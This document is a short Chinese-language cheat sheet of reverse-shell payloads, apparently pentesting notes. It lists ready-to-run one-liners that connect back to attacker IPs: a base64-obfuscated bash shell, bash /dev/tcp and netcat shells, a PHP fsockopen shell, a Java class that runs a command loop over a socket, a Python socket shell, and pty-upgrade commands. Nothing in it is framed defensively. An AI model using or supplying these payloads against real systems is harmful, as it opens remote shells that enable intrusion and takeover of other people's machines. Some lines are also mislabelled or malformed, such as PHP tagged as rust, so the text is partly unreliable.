# 反弹shell的各种编码各种语言

# 反弹shell的各种编码各种语言

base64编码后的linux下/bin/bash反弹shell:
bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDYuMTMuMC4yNDMvMTIzNDUgMD4mMQ=}|{base64,-d}|{bash,-i}'
linux的/bin/bash版本反弹shell：
bash -i >& /dev/tcp/192.168.45.217/1234 0>&1

bash -c "bash -i >& /dev/tcp/192.168.45.226/443 0>&1"

nc -e /bin/bash 192.168.45.5 1234

nc 192.168.45.5 1234|/bin/bash|192.168.45.5 12345

```rust
php -r '$sock=fsockopen("192.168.45.5",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

java反弹shell源码:
public class Revs {
    /**

    * @param args
        * @throws Exception 
        */
public static void main(String[] args) throws Exception {
        // TODO Auto-generated method stub
        Runtime r = Runtime.getRuntime();
        String cmd[]= {"/bin/bash","-c","exec 5<>/dev/tcp/192.168.99.242/1234;cat <&5 | while read line; do $line 2>&5 >&5; done"};
        Process p = r.exec(cmd);
        p.waitFor();
        }
}
javac将.java为jar执行
python互动式终端：

python -c 'import pty; pty.spawn ("/bin/bash")'

python3 -c 'import pty; pty.spawn ("/bin/bash")'

python反弹shell

python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.16.9',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
